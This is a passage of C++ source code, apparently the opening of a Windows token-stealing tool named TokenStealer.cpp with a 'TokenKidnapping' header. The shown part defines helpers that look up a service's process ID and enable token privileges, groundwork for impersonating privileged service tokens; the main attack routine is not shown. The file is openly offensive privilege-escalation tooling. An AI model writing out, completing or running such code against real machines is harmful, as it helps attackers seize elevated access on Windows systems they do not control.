// TokenStealer.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <wchar.h>
#include <stdlib.h>
#include "TokenKidnapping.h"
#include "common.h"

#pragma comment(lib,"ntdll.lib")

#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004


BOOL HasAssignPriv = FALSE;
extern wchar_t WinStationName[256];

DWORD GetServicePid(wchar_t* serviceName)
{
	const auto hScm = OpenSCManager(nullptr, nullptr, NULL);
	const auto hSc = OpenService(hScm, serviceName, SERVICE_QUERY_STATUS);

	SERVICE_STATUS_PROCESS ssp = {};
	DWORD bytesNeeded = 0;
	QueryServiceStatusEx(hSc, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &bytesNeeded);

	CloseServiceHandle(hSc);
	CloseServiceHandle(hScm);

	return ssp.dwProcessId;
}


PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
{
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}


BOOL EnablePriv(HANDLE hTokenIn, LPCTSTR priv)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	HANDLE hToken;

	if (hTokenIn == NULL)
	{
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		{
			printf("[-] OpeProcessToken err:%d\n", GetLastError());
			return FALSE;
		}
	}
	else
		hToken = hTokenIn;
	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("[-] LookupPrivilege err:%d\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustPrivilege err:%d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

